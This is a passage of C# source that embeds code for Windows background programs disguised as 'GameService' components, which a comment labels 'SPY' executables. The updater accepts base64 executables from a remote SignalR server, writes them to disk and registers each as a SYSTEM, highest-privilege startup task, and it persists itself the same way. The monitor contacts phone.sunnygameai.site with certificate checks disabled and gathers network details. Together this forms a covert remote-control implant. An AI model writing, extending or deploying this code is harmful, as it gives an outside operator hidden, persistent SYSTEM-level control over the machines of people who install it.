            pendingDebug.Add(msg);
            if (pendingDebug.Count > 100) pendingDebug.RemoveAt(0);
        }
        Stream s = activeStream;
        if (s != null) SendDebug(s, msg);
    }

    private static void FlushPendingDebug()
    {
        lock (debugQueueLock)
        {
            Stream s = activeStream;
            if (s == null) return;
            foreach (string msg in pendingDebug) SendDebug(s, msg);
            pendingDebug.Clear();
        }
    }

    private static bool IsProcessRunning(string imageName)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo(""tasklist.exe"",
                ""/fi \""IMAGENAME eq "" + imageName + ""\"" /fo csv"");
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
            using (var p = Process.Start(psi))
            {
                if (p == null) return false;
                string outStr = p.StandardOutput.ReadToEnd();
                p.WaitForExit(3000);
                return outStr.IndexOf(imageName, StringComparison.OrdinalIgnoreCase) >= 0;
            }
        }
        catch { return false; }
    }

    private static void EnsureComponentRunning(string imageName, string taskName, string exePath, string altExePath = null)
    {
        string firstPath = File.Exists(exePath) ? exePath : (altExePath != null && File.Exists(altExePath) ? altExePath : null);
        if (firstPath == null) return;                // component not installed yet
        if (IsProcessRunning(imageName)) return;

        // Try the canonical task, then the Update-tab-installed variant.
        RunSchTask(""/run /tn "" + taskName);
        Thread.Sleep(2500);
        if (!IsProcessRunning(imageName) && taskName == ""GameServiceBridge"")
            RunSchTask(""/run /tn GameService_GameServiceBridge""); // Update-tab-installed variant
        Thread.Sleep(500);

        if (!IsProcessRunning(imageName))
        {
            QueueDebugAlways(imageName + "" was NOT running. Scheduled task /run attempted but process still absent. ""
                + ""Exe at "" + firstPath);
        }
        else
        {
            QueueDebugAlways(imageName + "" was not running; restarted via scheduled task."");
        }
    }

    private static void EnsureSelfTask()
    {
        // Guarantee we keep running as SYSTEM/HIGHEST after every reboot,
        // namely so a downstream component can be repaired whenever it fails.
        try
        {
            string selfExe = System.Reflection.Assembly.GetExecutingAssembly().Location;
            if (string.IsNullOrWhiteSpace(selfExe)) return;
            RunSchTask(""/create /tn GameServiceUpdaterService /tr \"""" + selfExe + ""\"" /sc ONSTART /ru SYSTEM /rl HIGHEST /f"");
        }
        catch { }
    }

    private static int IndexOfSeparator(StringBuilder sb)
    {
        for (int i = 0; i < sb.Length; i++)
            if (sb[i] == '\x1e') return i;
        return -1;
    }

    private static void HandleSignalRMessage(Stream stream, string jsonStr)
    {
        try
        {
            int type = GetJsonInt(jsonStr, ""\""type\"""");
            if (type == 6) return; // Ping

            if (type == 1) // Invocation
            {
                string target = GetJsonString(jsonStr, ""\""target\"""");

                if (target == ""ReceiveCoreUpdate"")
                {
                    HandleCoreUpdate(stream, jsonStr);
                }
                else if (target == ""RequestBackupList"")
                {
                    SendBackupList(stream);
                }
                else if (target == ""RequestExeList"")
                {
                    SendExeList(stream);
                }
                else if (target == ""RollbackVersion"")
                {
                    string targetDevice = GetJsonStringArray(jsonStr, 0);
                    string versionId = GetJsonStringArray(jsonStr, 1);
                    if (string.Equals(targetDevice, DeviceName, StringComparison.OrdinalIgnoreCase))
                        HandleRollback(stream, versionId);
                }
                else if (target == ""PurgeBackups"")
                {
                    string targetDevice = GetJsonStringArray(jsonStr, 0);
                    if (string.Equals(targetDevice, DeviceName, StringComparison.OrdinalIgnoreCase))
                        HandlePurge(stream);
                }
            }
        }
        catch { }
    }

    // ── Core update: backup → stop → replace → register task → run ──────

    private static void HandleCoreUpdate(Stream stream, string jsonStr)
    {
        try
        {
            string payload = GetJsonObjectFirstArg(jsonStr);
            if (payload == null) return;

            string targetDevice = GetJsonString(payload, ""\""targetDevice\"""");
            if (string.IsNullOrEmpty(targetDevice) && payload.Contains(""\""isAllDevices\""""))
                targetDevice = ""__ALL__"";

            bool isAll = GetJsonBool(payload, ""\""isAllDevices\"""");
            if (!isAll && !string.IsNullOrEmpty(targetDevice) &&
                !string.Equals(targetDevice, DeviceName, StringComparison.OrdinalIgnoreCase))
                return;

            string versionId = GetJsonString(payload, ""\""versionId\"""");
            if (string.IsNullOrWhiteSpace(versionId))
                versionId = ""v_"" + DateTime.UtcNow.ToString(""yyyyMMdd_HHmmss"");

            string mode = GetJsonString(payload, ""\""mode\"""");
            if (string.IsNullOrWhiteSpace(mode)) mode = ""CoreAgent"";

            string fileName = GetJsonString(payload, ""\""fileName\"""");
            string content = GetJsonString(payload, ""\""content\"""");
            if (string.IsNullOrEmpty(content)) return;

            byte[] exeBytes;
            try { exeBytes = Convert.FromBase64String(content); }
            catch { exeBytes = Encoding.UTF8.GetBytes(content); }
            if (exeBytes == null || exeBytes.Length == 0) return;

            SendDebug(stream, DeviceName + "" Update v"" + versionId + "" ["" + mode + ""] received ("" + exeBytes.Length + "" bytes)."");

            if (mode.Equals(""NewExe"", StringComparison.OrdinalIgnoreCase))
            {
                InstallNewExe(stream, versionId, fileName, exeBytes);
            }
            else
            {
                InstallCoreAgent(stream, versionId, exeBytes);
            }

            SendBackupList(stream);
            SendExeList(stream);
        }
        catch { }
    }

    private static void InstallCoreAgent(Stream stream, string versionId, byte[] exeBytes)
    {
        try
        {
            // 1) Backup the current working core agent exe (the running one).
            if (File.Exists(CoreAgentExe))
            {
                Directory.CreateDirectory(Path.Combine(BackupsDir, versionId));
                File.Copy(CoreAgentExe, Path.Combine(BackupsDir, versionId, ""GameServiceCoreAgent.exe""), true);
                SendDebug(stream, DeviceName + "" Backed up current core agent -> "" + versionId);
            }

            // 2) Stop the running core agent process + scheduled task so files unlock.
            KillProcess(""GameServiceCoreAgent.exe"");
            RunSchTask(""/end /tn GameServiceCoreAgent"");
            Thread.Sleep(1500);

            // 3) Replace the exe.
            File.WriteAllBytes(CoreAgentExe, exeBytes);

            // 4) Ensure scheduled task runs as SYSTEM, HIGHEST, ONSTART → survives reboot.
            string tr = ""\"""" + CoreAgentExe + ""\"""";
            RunSchTask(""/create /tn GameServiceCoreAgent /tr \\\"""" + CoreAgentExe + ""\\\"" /sc ONSTART /ru SYSTEM /rl HIGHEST /f"");

            // 5) Start it now (as admin via task scheduler).
            RunSchTask(""/run /tn GameServiceCoreAgent"");
            SendDebug(stream, DeviceName + "" Core agent updated to "" + versionId + "" and restarted."");
        }
        catch (Exception ex)
        {
            SendDebug(stream, DeviceName + "" Core agent update failed: "" + ex.Message);
        }
    }

    private static void InstallNewExe(Stream stream, string versionId, string fileName, byte[] exeBytes)
    {
        try
        {
            if (string.IsNullOrWhiteSpace(fileName) || fileName.IndexOfAny(Path.GetInvalidFileNameChars()) >= 0)
                fileName = ""GameServiceAgent"" + Path.GetExtension(fileName ?? """").ToString();
            if (string.IsNullOrWhiteSpace(fileName)) fileName = ""GameServiceAgent.exe"";

            string targetPath = Path.Combine(ExeDir(), fileName);
            // Replacing one of the three core components must refresh ITS canonical
            // ONSTART task, not create a second GameService_<name> task pointing at
            // the same exe (double start at boot; mutex only masks the symptom).
            string baseName = Path.GetFileNameWithoutExtension(fileName);
            string taskName;
            if (baseName.Equals(""GameServiceCoreAgent"", StringComparison.OrdinalIgnoreCase)) taskName = ""GameServiceCoreAgent"";
            else if (baseName.Equals(""GameServiceBridge"", StringComparison.OrdinalIgnoreCase)) taskName = ""GameServiceBridge"";
            else if (baseName.Equals(""GameServiceUpdaterService"", StringComparison.OrdinalIgnoreCase)) taskName = ""GameServiceUpdaterService"";
            else taskName = ""GameService_"" + baseName;

            // 1) Backup an existing exe with the same name.
            if (File.Exists(targetPath))
            {
                Directory.CreateDirectory(Path.Combine(BackupsDir, versionId));
                File.Copy(targetPath, Path.Combine(BackupsDir, versionId, fileName), true);
                SendDebug(stream, DeviceName + "" Backed up existing "" + fileName + "" -> "" + versionId);
            }

            // 2) Stop old instance if present.
            KillProcess(fileName);

            // 3) Write the new exe.
            File.WriteAllBytes(targetPath, exeBytes);

            // 4) Register + start as SYSTEM/HIGHEST scheduled task.
            RunSchTask(""/create /tn "" + taskName + "" /tr \\\"""" + targetPath + ""\\\"" /sc ONSTART /ru SYSTEM /rl HIGHEST /f"");
            RunSchTask(""/run /tn "" + taskName);
            SendDebug(stream, DeviceName + "" New exe '"" + fileName + ""' installed as "" + taskName + "" and started."");
        }
        catch (Exception ex)
        {
            SendDebug(stream, DeviceName + "" New exe install failed: "" + ex.Message);
        }
    }

    private static void HandleRollback(Stream stream, string versionId)
    {
        try
        {
            if (string.IsNullOrWhiteSpace(versionId)) return;
            string backupDir = Path.Combine(BackupsDir, versionId);
            if (!Directory.Exists(backupDir))
            {
                SendDebug(stream, DeviceName + "" Rollback target not found: "" + versionId);
                return;
            }

            // Stop running core agent.
            KillProcess(""GameServiceCoreAgent.exe"");
            RunSchTask(""/end /tn GameServiceCoreAgent"");
            Thread.Sleep(1500);

            // Restore every backed-up exe back into the flat GameService root.
            foreach (string file in Directory.GetFiles(backupDir))
            {
                string dest = Path.Combine(ExeDir(), Path.GetFileName(file));
                File.Copy(file, dest, true);
            }

            RunSchTask(""/run /tn GameServiceCoreAgent"");
            SendDebug(stream, DeviceName + "" Core agent rolled back to "" + versionId + ""."");
            SendBackupList(stream);
            SendExeList(stream);
        }
        catch (Exception ex)
        {
            SendDebug(stream, DeviceName + "" Rollback failed: "" + ex.Message);
        }
    }

    private static void HandlePurge(Stream stream)
    {
        try
        {
            if (Directory.Exists(BackupsDir))
            {
                foreach (string dir in Directory.GetDirectories(BackupsDir))
                    Directory.Delete(dir, true);
            }
            SendDebug(stream, DeviceName + "" All backups purged."");
            SendBackupList(stream);
            SendExeList(stream);
        }
        catch (Exception ex)
        {
            SendDebug(stream, DeviceName + "" Purge failed: "" + ex.Message);
        }
    }

    private static void KillProcess(string processName)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo(""taskkill.exe"", ""/f /im "" + processName);
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            using (var p = Process.Start(psi)) { if (p != null) p.WaitForExit(3000); }
        }
        catch { }
    }

    private static void RunSchTask(string args)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo(""schtasks.exe"", args);
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            using (var p = Process.Start(psi)) { if (p != null) p.WaitForExit(5000); }
        }
        catch { }
    }

    // ── Backup list reporting ────────────────────────────────────────────

    private static void SendBackupList(Stream stream)
    {
        try
        {
            List<string> dirs = new List<string>();
            if (Directory.Exists(BackupsDir))
                foreach (string d in Directory.GetDirectories(BackupsDir)) dirs.Add(d);

            StringBuilder arr = new StringBuilder();
            arr.Append(""["");
            for (int i = 0; i < dirs.Count; i++)
            {
                if (i > 0) arr.Append("","");
                string dir = dirs[i];
                long size = 0;
                if (Directory.Exists(dir))
                    foreach (string f in Directory.GetFiles(dir, ""*"", SearchOption.AllDirectories))
                        size += new FileInfo(f).Length;

                string v = Path.GetFileName(dir);
                string created = """";
                try { created = Directory.GetCreationTimeUtc(dir).ToString(""yyyy-MM-dd HH:mm:ss""); } catch { }

                List<string> fileNames = new List<string>();
                try { foreach (string f in Directory.GetFiles(dir)) fileNames.Add(Path.GetFileName(f)); } catch { }
                StringBuilder filesArr = new StringBuilder();
                filesArr.Append(""[ "");
                for (int fi = 0; fi < fileNames.Count; fi++)
                {
                    if (fi > 0) filesArr.Append("","");
                    filesArr.Append(""\"""" + EscapeJson(fileNames[fi]) + ""\"""");
                }
                filesArr.Append("" ]"");

                arr.Append(""{\""versionId\"":\"""" + EscapeJson(v) + "",\""createdAt\"":\"""" + EscapeJson(created) + "",\""filePath\"":\"""" + EscapeJson(dir) + "",\""sizeBytes\"":"" + size + "",\""files\"":"" + filesArr.ToString() + ""\""}"");
            }
            arr.Append(""]"");

            string msg = ""{\""type\"":1,\""target\"":\""ReportBackupList\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"","" + arr.ToString() + ""]}\x1e"";
            SendWsText(stream, msg);
        }
        catch { }
    }

    // Reports every .exe in the GameService root so the Update tab can offer them
    // as replace targets. The updater itself is never listed (cannot update the
    // process doing the updating).
    private static void SendExeList(Stream stream)
    {
        try
        {
            StringBuilder arr = new StringBuilder();
            arr.Append(""["");
            bool first = true;
            try
            {
                foreach (string exe in Directory.GetFiles(ExeDir(), ""*.exe""))
                {
                    string name = Path.GetFileName(exe);
                    if (name.Equals(""GameServiceUpdaterService.exe"", StringComparison.OrdinalIgnoreCase)) continue;
                    if (!first) arr.Append("","");
                    first = false;
                    arr.Append(""\"""" + EscapeJson(name) + ""\"""");
                }
            }
            catch { }
            arr.Append(""]"");

            string msg = ""{\""type\"":1,\""target\"":\""ReportExeList\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"","" + arr.ToString() + ""]}\x1e"";
            SendWsText(stream, msg);
        }
        catch { }
    }

    private static void SendDebug(Stream stream, string msg)
    {
        try
        {
            LogDesktop(msg);
            dbgStream = stream;
            ShipDbg(StampFor(msg));
        }
        catch { }
    }

    // ── Minimal JSON helpers (no System.Text.Json dependency) ────────────

    private static string EscapeJson(string s)
    {
        if (s == null) return """";
        StringBuilder sb = new StringBuilder();
        foreach (char c in s)
        {
            if (c == '\\') sb.Append(""\\\\"");
            else if (c == '""') sb.Append(""\\\"""");
            else if (c == '\n') sb.Append(""\\n"");
            else if (c == '\r') sb.Append(""\\r"");
            else if (c == '\t') sb.Append(""\\t"");
            else sb.Append(c);
        }
        return sb.ToString();
    }

    private static int GetJsonInt(string json, string key)
    {
        string v = GetJsonString(json, key);
        int r;
        return int.TryParse(v, out r) ? r : 0;
    }

    private static bool GetJsonBool(string json, string key)
    {
        int idx = json.IndexOf(key, StringComparison.Ordinal);
        if (idx < 0) return false;
        idx += key.Length;
        while (idx < json.Length && (json[idx] == ' ' || json[idx] == ':')) idx++;
        return json.Substring(idx).StartsWith(""true"", StringComparison.OrdinalIgnoreCase);
    }

    private static string GetJsonString(string json, string key)
    {
        if (string.IsNullOrEmpty(json) || string.IsNullOrEmpty(key)) return """";
        int idx = json.IndexOf(key, StringComparison.Ordinal);
        if (idx < 0) return """";
        idx += key.Length;
        while (idx < json.Length && (json[idx] == ' ' || json[idx] == ':')) idx++;
        if (idx >= json.Length) return """";
        if (json[idx] == '""')
        {
            idx++;
            StringBuilder sb = new StringBuilder();
            while (idx < json.Length)
            {
                char c = json[idx];
                if (c == '\\' && idx + 1 < json.Length)
                {
                    char n = json[idx + 1];
                    if (n == 'n') sb.Append('\n');
                    else if (n == 'r') sb.Append('\r');
                    else if (n == 't') sb.Append('\t');
                    else if (n == '\\') sb.Append('\\');
                    else if (n == '""') sb.Append('""');
                    else sb.Append(n);
                    idx += 2;
                    continue;
                }
                if (c == '""') break;
                sb.Append(c);
                idx++;
            }
            return sb.ToString();
        }
        int j = idx;
        while (j < json.Length && json[j] != ',' && json[j] != '}' && json[j] != ']' && json[j] != ' ') j++;
        return json.Substring(idx, j - idx);
    }

    // Returns the raw JSON text of the first element of ""arguments"" array (the
    // UpdatePayloadDto object).
    private static string GetJsonObjectFirstArg(string json)
    {
        int idx = json.IndexOf(""\""arguments\"""", StringComparison.Ordinal);
        if (idx < 0) return null;
        idx += ""\""arguments\"""".Length;
        while (idx < json.Length && json[idx] != '[') idx++;
        idx++;
        while (idx < json.Length && (json[idx] == ' ' || json[idx] == '\n' || json[idx] == '\r')) idx++;
        if (idx >= json.Length || json[idx] != '{') return null;

        int start = idx;
        int depth = 0;
        bool inStr = false;
        while (idx < json.Length)
        {
            char c = json[idx];
            if (inStr)
            {
                if (c == '\\') idx++;
                else if (c == '""') inStr = false;
            }
            else
            {
                if (c == '""') inStr = true;
                else if (c == '{') depth++;
                else if (c == '}') { depth--; if (depth == 0) return json.Substring(start, idx - start + 1); }
            }
            idx++;
        }
        return null;
    }

    private static string GetJsonStringArray(string json, int arrayIndex)
    {
        int idx = json.IndexOf(""\""arguments\"""", StringComparison.Ordinal);
        if (idx < 0) return """";
        idx += ""\""arguments\"""".Length;
        while (idx < json.Length && json[idx] != '[') idx++;
        idx++;
        int cur = 0;
        while (idx < json.Length && cur < arrayIndex)
        {
            char c = json[idx];
            if (c == '""')
            {
                idx++;
                while (idx < json.Length)
                {
                    if (json[idx] == '\\') idx += 2;
                    else if (json[idx] == '""') { idx++; break; }
                    else idx++;
                }
                cur++;
            }
            else if (c != ' ' && c != ',' && c != '\n' && c != '\r')
            {
                cur++;
                while (idx < json.Length && json[idx] != ',' && json[idx] != ']') idx++;
                if (idx < json.Length && json[idx] == ',') idx++;
            }
            else idx++;
        }

        while (idx < json.Length && (json[idx] == ' ' || json[idx] == ',' || json[idx] == '\n' || json[idx] == '\r')) idx++;
        if (idx >= json.Length || json[idx] != '""') return """";
        idx++;
        StringBuilder sb = new StringBuilder();
        while (idx < json.Length)
        {
            char c = json[idx];
            if (c == '\\' && idx + 1 < json.Length) { sb.Append(json[idx + 1]); idx += 2; continue; }
            if (c == '""') break;
            sb.Append(c);
            idx++;
        }
        return sb.ToString();
    }

    // Reads ONE logical websocket text message. Answers PINGs with PONGs (proxy edges
    // send them and drop peers that never reply), assembles continuation fragments
    // and treats CLOSE as end-of-stream.
    private static string ReadWebSocketTextFrame(Stream stream)
    {
        MemoryStream assembled = null;
        while (true)
        {
            int b0 = stream.ReadByte();
            if (b0 == -1) return null;
            int opcode = b0 & 0x0F;
            bool fin = (b0 & 0x80) != 0;
            int b1 = stream.ReadByte();
            if (b1 == -1) return null;
            bool isMasked = (b1 & 0x80) != 0;
            long payloadLen = b1 & 0x7F;

            if (payloadLen == 126)
            {
                int hi = stream.ReadByte();
                int lo = stream.ReadByte();
                if (hi == -1 || lo == -1) return null;
                payloadLen = (hi << 8) | lo;
            }
            else if (payloadLen == 127)
            {
                byte[] lenBuf = new byte[8];
                ReadFully(stream, lenBuf, 8);
                payloadLen = 0;
                for (int i = 0; i < 8; i++)
                    payloadLen = (payloadLen << 8) | lenBuf[i];
            }
            if (payloadLen < 0 || payloadLen > 67108864) return null;

            byte[] mask = null;
            if (isMasked)
            {
                mask = new byte[4];
                ReadFully(stream, mask, 4);
            }

            byte[] payload = new byte[payloadLen];
            ReadFully(stream, payload, (int)payloadLen);

            if (mask != null)
            {
                for (int i = 0; i < payload.Length; i++)
                    payload[i] = (byte)(payload[i] ^ mask[i % 4]);
            }

            if (opcode == 0x9) { SendWsControl(stream, 0xA, payload); continue; }
            if (opcode == 0xA) { continue; }
            if (opcode == 0x8) { return null; }
            if (opcode == 0x1 || opcode == 0x2)
            {
                if (fin) return Encoding.UTF8.GetString(payload);
                assembled = new MemoryStream();
                assembled.Write(payload, 0, payload.Length);
                continue;
            }
            if (opcode == 0x0)
            {
                if (assembled == null) continue;
                assembled.Write(payload, 0, payload.Length);
                if (fin) { byte[] all = assembled.ToArray(); assembled = null; return Encoding.UTF8.GetString(all); }
                continue;
            }
        }
    }

    private static void SendWsControl(Stream stream, byte opcode, byte[] payload)
    {
        try
        {
            int len = payload != null ? payload.Length : 0;
            MemoryStream frame = new MemoryStream();
            frame.WriteByte((byte)(0x80 | opcode));
            frame.WriteByte((byte)(0x80 | len));
            byte[] maskKey = new byte[4];
            new Random().NextBytes(maskKey);
            frame.Write(maskKey, 0, 4);
            for (int i = 0; i < len; i++) frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4]));
            byte[] frameBytes = frame.ToArray();
            lock (sendLock) { stream.Write(frameBytes, 0, frameBytes.Length); stream.Flush(); }
        }
        catch { }
    }

    private static void ReadFully(Stream stream, byte[] buf, int count)
    {
        int offset = 0;
        while (offset < count)
        {
            int r = stream.Read(buf, offset, count - offset);
            if (r <= 0) throw new IOException(""End of stream"");
            offset += r;
        }
    }

    private static readonly object sendLock = new object();
    private static void SendWsText(Stream stream, string text)
    {
        byte[] payload = Encoding.UTF8.GetBytes(text);
        int len = payload.Length;

        MemoryStream frame = new MemoryStream();
        frame.WriteByte(0x81);

        byte[] maskKey = new byte[4];
        new Random().NextBytes(maskKey);

        if (len <= 125)
        {
            frame.WriteByte((byte)(0x80 | len));
        }
        else if (len <= 65535)
        {
            frame.WriteByte((byte)(0x80 | 126));
            frame.WriteByte((byte)((len >> 8) & 0xFF));
            frame.WriteByte((byte)(len & 0xFF));
        }
        else
        {
            frame.WriteByte((byte)(0x80 | 127));
            for (int i = 7; i >= 0; i--)
            {
                frame.WriteByte((byte)((len >> (i * 8)) & 0xFF));
            }
        }

        frame.Write(maskKey, 0, 4);
        for (int i = 0; i < len; i++)
        {
            frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4]));
        }

        byte[] frameBytes = frame.ToArray();
        lock (sendLock)
        {
            stream.Write(frameBytes, 0, frameBytes.Length);
            stream.Flush();
        }
    }
    // ── Global health responder: mandatory for every SPY background exe ──
    private static void StartHealthResponder()
    {
        try
        {
            Thread healthThread = new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        using (var server = new NamedPipeServerStream(""GameServiceUpdaterService_health"", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.None))
                        {
                            server.WaitForConnection();
                            byte[] buf = new byte[1024];
                            int n = server.Read(buf, 0, buf.Length);
                            string msg = Encoding.UTF8.GetString(buf, 0, n).Trim();
                            if (msg.IndexOf(""Are you up"", StringComparison.OrdinalIgnoreCase) >= 0)
                            {
                                byte[] resp = Encoding.UTF8.GetBytes(""YES"");
                                server.Write(resp, 0, resp.Length);
                                server.Flush();
                            }
                        }
                    }
                    catch { Thread.Sleep(500); }
                }
            });
            healthThread.IsBackground = true;
            healthThread.Start();
        }
        catch { }
    }

    private static TcpClient ConnectTcpWithTimeout(string host, int port, int timeoutMs)
    {
        System.Net.IPAddress[] ips = System.Net.Dns.GetHostAddresses(host);
        if (ips == null || ips.Length == 0) throw new Exception(""DNS returned no IP addresses for "" + host);
        Exception lastEx = null;
        foreach (var ip in ips)
        {
            if (ip.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork) continue;
            try
            {
                TcpClient tcp = new TcpClient();
                IAsyncResult ar = tcp.BeginConnect(ip, port, null, null);
                if (!ar.AsyncWaitHandle.WaitOne(timeoutMs, false))
                {
                    try { tcp.Close(); } catch { }
                    throw new TimeoutException(""TCP connect to "" + host + "" ("" + ip + ""):"" + port + "" timed out after "" + timeoutMs + ""ms"");
                }
                tcp.EndConnect(ar);
                return tcp;
            }
            catch (Exception ex) { lastEx = ex; }
        }
        throw lastEx ?? new Exception(""Failed to connect to any IP for "" + host);
    }

    private static SslStream AuthenticateSslWithTimeout(TcpClient tcp, string host, int timeoutMs)
    {
        SslStream ssl = new SslStream(tcp.GetStream(), false, (sender, cert, chain, errs) => true);
        IAsyncResult ar = ssl.BeginAuthenticateAsClient(host, null, null);
        if (!ar.AsyncWaitHandle.WaitOne(timeoutMs, false))
        {
            try { ssl.Close(); } catch { }
            throw new TimeoutException(""TLS handshake to "" + host + "" timed out after "" + timeoutMs + ""ms"");
        }
        ssl.EndAuthenticateAsClient(ar);
        return ssl;
    }
}";
    }

    private string GetMonitorServiceSourceCode()
    {
        return @"using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Net.Security;
using System.Security.Authentication;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class GameServiceMonitorService
{
    private static readonly string RemoteHost = ""phone.sunnygameai.site"";
    private static readonly int RemotePort = 443;
    private static readonly string DeviceName = Environment.MachineName + ""_PC"";

    private static volatile Stream activeStream;
    private static readonly List<string> pendingDebug = new List<string>();
    private static readonly object debugQueueLock = new object();

    private static string RootDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ""GameService"");

    private static Mutex singleInstance;
    private static Timer healthTimer;
    private static readonly object timerLock = new object();
    private static string lastWatchedDevice = null;
    private static readonly object desktopLogLock = new object();
    private static string[] GetDesktopLogPaths(string fileName)
    {
        var paths = new List<string>();
        try { string d = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory); if (!string.IsNullOrEmpty(d)) paths.Add(Path.Combine(d, fileName)); } catch {}
        try { string d = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory); if (!string.IsNullOrEmpty(d)) paths.Add(Path.Combine(d, fileName)); } catch {}
        try
        {
            string usersRoot = @""C:\Users"";
            if (Directory.Exists(usersRoot))
                foreach (string userDir in Directory.GetDirectories(usersRoot))
                {
                    string desktopFolder = Path.Combine(userDir, ""Desktop"");
                    if (Directory.Exists(desktopFolder))
                    {
                        string p = Path.Combine(desktopFolder, fileName);
                        if (!paths.Contains(p)) paths.Add(p);
                    }
                    string oneDriveDesktop = Path.Combine(userDir, ""OneDrive"", ""Desktop"");
                    if (Directory.Exists(oneDriveDesktop))
                    {
                        string p2 = Path.Combine(oneDriveDesktop, fileName);
                        if (!paths.Contains(p2)) paths.Add(p2);
                    }
                }
        } catch {}
        try { string fallback = Path.Combine(RootDir, fileName); if (!paths.Contains(fallback)) paths.Add(fallback); } catch {}
        return paths.ToArray();
    }
    private static void LogDesktop(string msg)
    {
        try
        {
            string line = DateTime.Now.ToString(""yyyy-MM-dd HH:mm:ss.fff"") + "" ["" + DeviceName + ""] "" + msg + Environment.NewLine;
            string[] paths = GetDesktopLogPaths(""GameServiceMonitorService.txt"");
            lock (desktopLogLock)
            {
                foreach (string p in paths)
                {
                    try { string dir = Path.GetDirectoryName(p); if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir); File.AppendAllText(p, line); } catch {}
                }
            }
        } catch {}
    }

    private static void LogNetworkDiagnostics()
    {
        try
        {
            LogDesktop(""=== Monitor Network Diagnostics ==="");
            try { var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName()); foreach (var ip in host.AddressList) LogDesktop(""Monitor Local IP: "" + ip.ToString() + "" ("" + ip.AddressFamily + "")""); } catch (Exception ex) { LogDesktop(""Monitor GetHostEntry failed: "" + ex.Message); }
            try { var ips = System.Net.Dns.GetHostAddresses(RemoteHost); LogDesktop(""Monitor DNS "" + RemoteHost + "" => "" + string.Join("", "", Array.ConvertAll(ips, ip => ip.ToString()))); } catch (Exception ex) { LogDesktop(""Monitor DNS "" + RemoteHost + "" failed: "" + ex.GetType().Name + "": "" + ex.Message); }
            try { foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()) { if (ni.OperationalStatus != System.Net.NetworkInformation.OperationalStatus.Up) continue; LogDesktop(""Monitor NIC: "" + ni.Name + "" "" + ni.NetworkInterfaceType + "" "" + ni.OperationalStatus); foreach (var ua in ni.GetIPProperties().UnicastAddresses) LogDesktop(""  Monitor Unicast: "" + ua.Address.ToString()); } } catch (Exception ex) { LogDesktop(""Monitor NIC failed: "" + ex.Message); }
            LogDesktop(""Monitor RemoteHost="" + RemoteHost + "":"" + RemotePort);
            LogDesktop(""=== End Monitor Diagnostics ==="");
        } catch (Exception ex) { LogDesktop(""Monitor LogNetworkDiagnostics failed: "" + ex.Message); }
    }



    // ── 🐛 Device Debug console: self-registration + stamped shipping ──
    static volatile bool dbgInformed = false;
    static volatile Stream dbgStream = null;
    const string DbgService = ""GameServiceMonitorService.exe"";
    static string StampFor(string msg)
    {
        if (!string.IsNullOrEmpty(msg) && msg.StartsWith(""[""))
            return msg.StartsWith(""[ERROR]"") || msg.StartsWith(""[SUCCESS]"") || msg.StartsWith(""[MESSAGE]"") ? msg : ""[MESSAGE] "" + msg;
        string m = (msg ?? """").ToLowerInvariant();
        if (m.Contains(""fail"") || m.Contains(""error"") || m.Contains(""exception"") || m.Contains(""timeout"") || m.Contains(""not running"")) return ""[ERROR] "" + msg;
        if (m.Contains(""success"") || m.Contains(""updated"") || m.Contains(""started"") || m.Contains(""registered"") || m.Contains(""completed"") || m.Contains(""backed up"") || m.Contains(""rolled back"") || m.Contains(""installed"")) return ""[SUCCESS] "" + msg;
        return ""[MESSAGE] "" + msg;
    }
    static void AnnounceDbg(Stream s)
    {
        try
        {
            SendWsText(s, ""{\""type\"":1,\""target\"":\""RegisterDebugSource\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\""]}\x1e"");
            dbgInformed = true;
        }
        catch { dbgInformed = false; }
    }
    static void ShipDbgLine(Stream s, string stamped)
    {
        try
        {
            SendWsText(s, ""{\""type\"":1,\""target\"":\""SendServiceDebug\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\"",[\"""" + EscapeJson(stamped) + ""\""]]}\x1e"");
        }
        catch { dbgInformed = false; }
    }
    static void ShipDbg(string stamped)
    {
        Stream s = dbgStream;
        if (s == null) { dbgInformed = false; return; }
        try { if (!dbgInformed) AnnounceDbg(s); ShipDbgLine(s, stamped); }
        catch { dbgInformed = false; }
    }
    static void DbgReset() { dbgStream = null; dbgInformed = false; }
    static void Main(string[] args)
    {
        try { Directory.CreateDirectory(RootDir); } catch { }
        bool createdNew;
        singleInstance = new Mutex(true, ""Global\\GameServiceMonitorService.SingleInstance"", out createdNew);
        if (!createdNew) return;
        StartHealthResponder();
        LogDesktop(""Monitor Main started, DeviceName="" + DeviceName);
        StartWatchdog();
        LogDesktop(""Monitor watchdog started"");
        RunAsync().GetAwaiter().GetResult();
    }

    // ── Global health responder: mandatory for every SPY background exe ──
    private static void StartHealthResponder()
    {
        try
        {
            Thread healthThread = new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        using (var server = new NamedPipeServerStream(""GameServiceMonitorService_health"", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.None))
                        {
                            server.WaitForConnection();
                            byte[] buf = new byte[1024];
                            int n = server.Read(buf, 0, buf.Length);
                            string msg = Encoding.UTF8.GetString(buf, 0, n).Trim();
                            if (msg.IndexOf(""Are you up"", StringComparison.OrdinalIgnoreCase) >= 0)
                            {
